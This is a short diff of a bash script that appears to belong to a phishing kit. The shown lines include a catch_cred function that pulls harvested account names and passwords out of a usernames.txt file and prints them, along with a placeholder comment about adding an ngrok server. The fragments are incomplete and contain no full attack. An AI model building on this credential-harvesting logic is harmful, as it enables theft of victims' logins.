@@ -183,7 +183,7 @@ fi
 
 stop() {
 
-
+                                      ADD NGROK SERVER TOO
 checkphp=$(ps aux | grep -o "php" | head -n1)
 
 if [[ $checkphp == *'php'* ]]; then
@@ -252,7 +252,7 @@ printf '</html>\n' >> sites/create/login.html
 
 catch_cred() {
 
-account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
+account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)   
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
